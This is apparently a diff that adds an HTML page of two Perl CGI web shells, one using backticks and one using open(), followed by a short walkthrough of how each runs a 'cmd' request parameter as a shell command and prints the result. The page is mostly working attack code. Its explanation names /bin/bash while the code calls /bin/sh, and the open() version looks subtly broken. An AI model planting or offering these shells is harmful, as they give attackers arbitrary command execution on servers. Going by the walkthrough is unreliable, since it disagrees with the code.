@@ -1,0 +1,36 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>CMDi</title>
+</head><body><b>With ``</b><br/>
+#!/usr/bin/perl <br/>
+#web shell using backticks<br/>
+use CGI;<br/>
+my $cgi = new CGI;<br/>
+my $command = $cgi-&gt;param('cmd');<br/>
+if($command eq "")<br/>
+{<br/>
+$command = "pwd";<br/>
+}<br/>
+$result = `$command`;<br/>
+print $result;<br/>
+exit; <br/>
+<br/>
+<b>With open()</b><br/>
+#!/usr/bin/perl<br/>
+#web shell open<br/>
+use CGI;<br/>
+my $cgi = new CGI;<br/>
+my $command = $cgi-&gt;param('cmd');<br/>
+if($command eq "")<br/>
+{<br/>
+$command = "pwd";<br/>
+}<br/>
+open lol, "/bin/sh $command|" or die "Failed to open pipeline"; <br/>
+while(&lt;lol&gt;) {<br/>
+print;<br/>
+}<br/>
+exit;<br/>
+<br/>
+First we declare the program as a perl document with #!/usr/bin/perl. Then we declare some objects for cgi and declare some variables. my $command = $cgi-&gt;param('cmd'); sets the variable 'command' to the GET'd variable 'cmd'. A funny thing about perl is that $cgi-&gt;param() functions with both GET and POST variables unlike other languages which make the distinction between the 2 requests. The code then checks to see if the command string is null filling it with 'pwd' if it is. It then passes the command to the backtick operators which executes the command and then prints the result. In the other version instead of using the backtick operators, the code uses open() with a handle to the process being read, then the command is passed as part of the string to /bin/bash to be executed. Then the output is printed. </body></html>
